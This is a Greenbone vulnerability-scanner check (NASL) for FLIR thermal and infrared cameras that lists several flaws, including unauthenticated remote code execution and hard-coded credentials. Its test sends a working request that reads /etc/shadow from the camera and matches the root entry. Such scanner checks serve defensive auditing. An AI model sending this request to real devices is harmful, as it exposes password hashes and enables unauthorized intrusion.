# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:flir_systems:camera";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140401");
  script_version("2025-03-20T05:38:32+0000");
  script_tag(name:"last_modification", value:"2025-03-20 05:38:32 +0000 (Thu, 20 Mar 2025)");
  script_tag(name:"creation_date", value:"2017-09-26 16:38:33 +0700 (Tue, 26 Sep 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("FLIR Systems Cameras Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_flir_systems_detect.nasl");
  script_mandatory_keys("flir_camera/detected");

  script_tag(name:"summary", value:"FLIR Systems FLIR Thermal/Infrared Camera FC-Series S, FC-Series ID,
  PT-Series are prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"FLIR Systems FLIR Thermal/Infrared Camera FC-Series S, FC-Series ID,
  PT-Series are prone to multiple vulnerabilities:

  - Information disclosure

  - Stream disclosure

  - Unauthenticated Remote Code Execution

  - Authenticated Remote Code Execution

  - Hard-coded Credentials");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3411");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/api/xml?file=/etc/shadow";

if (http_vuln_check(port: port, url: url, pattern: "root:.*:0:", check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
